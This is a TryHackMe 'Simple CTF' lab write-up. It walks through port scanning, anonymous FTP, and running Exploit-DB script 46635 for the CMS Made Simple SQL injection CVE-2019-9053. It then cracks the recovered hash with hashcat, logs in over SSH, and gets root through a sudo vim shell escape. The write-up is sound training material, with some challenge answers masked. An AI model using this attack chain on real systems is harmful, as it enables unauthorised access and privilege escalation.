# Simple CTF - TryHackMe Write-up

- **Platform:** [TryHackMe](https://tryhackme.com/)
- **Room:** Simple CTF
- **Difficulty:** Easy
- **Category:** Web Exploitation & Boot2Root
- **Tools Used:** Kali Linux
  
## Challenge Overview
This challenge, we hack into a beginner-friendly Linux server with an outdated website and poor security settings.

## Recon
We use nmap to find what port is open

```bash
nmap -Pn -sC -sV -T4
```
- -Pn : Skip ping scanning
- -sC : use default scanning
- -sV : tell version of the port that we found
- -T4 : make the scanning more faster

<img width="813" height="570" alt="image" src="https://github.com/user-attachments/assets/039ae296-4e8a-4c26-bfee-8127674a4287" />


we found port
- 21/ftp
- 80/http
- 2222/ssh

> 1. How many services are running under port 1000? *
> 2. What is running on the higher port? s**

## Exploitation

Letx explore the open port. I start with exploring the ftp port first (21)

**FTP**

```bash
ftp <target ip address>
```

<img width="1341" height="551" alt="image" src="https://github.com/user-attachments/assets/23d5806d-4c5a-437d-ad4b-e4e42d8442d3" />

I found there is directory ```pub``` at ftp root so we 

```bash
cd  pub
```

and then i found there is txt file name ```ForMitch.txt```. Lets open the file.

<img width="1336" height="45" alt="image" src="https://github.com/user-attachments/assets/d7e7788c-a1ce-490b-95dc-04d5311fbdd6" />

We have several clues here :
1. user name , mitch
2. he use weak password ( we can crack this by using list on rockyou.txt)
3. he use same password


Now, lets we go explore other open port

**HTTP**

We found there is page robots.txt in http port. let see what in it 

<img width="905" height="620" alt="image" src="https://github.com/user-attachments/assets/92ddcec0-51b0-4e4f-b950-6f70afa89db7" />

We found several clues here
1. there is user name mike
2. there is page /openemr-5_0_1_3

/openemr-5_0_1_3 seems interesting. lets look in it:

<img width="837" height="228" alt="image" src="https://github.com/user-attachments/assets/7d4274cd-8436-47af-a4d9-6edd0ffd1f5b" />


hmmmm, lets try gobuster to find any directories that we can access :

```bash
gobuster dir -u http://target ip address/ -w /usr/share/wordlist/dirb/common.txt
```

<img width="738" height="425" alt="image" src="https://github.com/user-attachments/assets/3ca04d5b-fb5c-45b6-9eff-e794a3521920" />

wer found /simple directory.  let see what in it


<img width="1916" height="882" alt="image" src="https://github.com/user-attachments/assets/5f53cb9c-c465-4f42-8f12-dffaffc55b92" />


we scroll down a little bit and wee found 

<img width="341" height="121" alt="image" src="https://github.com/user-attachments/assets/2e72cc16-c9ef-4dd1-b84e-610b8b50661c" />


Now that we know the software name and exact version (CMS Made Simple version 2.2.8), we can search for any known security vulnerabilities

Type
```bash
searchsploit "CMS Made Simple" 2.2.8
```

and

```bash
searchsploit -p 46635
```

-p does 2 things :

1. **Shows detailed info:** It looks up that specific exploit ID and displays extra metadata, including its CVE, author, and online Exploit-DB link.

2. **Copies the full file path:** It prints the exact, absolute path on your Kali system (and copies it to your clipboard if supported) so you know where the file is stored.


The search result points to an Unauthenticated SQL Injection (SQLi) exploit:

- Vulnerability: CMS Made Simple < 2.2.10 - SQL Injection

- CVE ID: CVE-2019-9053

- Exploit Script: 46635.py

> 3. What's the CVE you're using against the application? CVE-2019-9053
> 4. To what kind of vulnerability is the application vulnerable? s***


After we found the CVE, let's copy the exploit file (46635.py) into our current folder using :

```bash
searchsploit -m 46635
```

Because the original script was written in Python 2, we can convert it to Python 3 using Kali's built-in 2to3 tool so it runs smoothly without syntax errors:

```bash
2to3 -w 46635.py
```

Now, let's run the script


```bash
python3 46635.py -u http://<TARGET_IP>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```


After run the script, the exploit extracts the following details from the database:

<img width="407" height="87" alt="image" src="https://github.com/user-attachments/assets/70bbd833-a3b6-4db2-98f0-be8c2f1e2536" />

we found the hash password but the script doenst crack hash password, it's okay. we can use ```hashcat```.

```bash
hashcat -m 20 -a 0 "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" /usr/share/wordlists/rockyou.txt
```

once Hashcat finishes, we can view the cracked password:

```bash
hashcat -m 20 "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" --show
```


> 5. What's the password? s*****


# Login SSH 

After we found the username and the password, we know SSH is running on the custom port 2222. Let's log in with credentials that we found:

<img width="777" height="340" alt="image" src="https://github.com/user-attachments/assets/e2166f78-6a6e-4309-a8ad-9855799f382b" />

now let explore a little bit to answer the question

<img width="711" height="123" alt="image" src="https://github.com/user-attachments/assets/8405f924-f59e-4e56-9e9e-5a9eba7ff8c4" />

> 6. What's the user flag? *******
> 7. Is there any other user in the home directory? What's its name? ******


# Priviledge Escalation

Oftentimes we can get a root shell by abusing misconfigurations in the system. sudo is generally a good first candidate to check. We can see what rights a user has using the 

```bash
sudo -l 
```

<img width="515" height="55" alt="image" src="https://github.com/user-attachments/assets/030d78f5-2452-4517-8ba5-5730fa30aee0" />

This means mitch can execute vim as root without needing a password.

Vim is a text editor with many interesting features, one of which is spawning a shell. Running vim with sudo will allow us to then spawn a root shell!

> 8. What can you leverage to spawn a privileged shell? ***

Once inside, we can spawn a shell with the following command:

```bash
:!bash
```

<img width="436" height="67" alt="image" src="https://github.com/user-attachments/assets/faece0e8-18f7-4979-bc56-edaa4ad0c84b" />


And then we can read the final flag by

``` bash
cat /root/root.txt
```





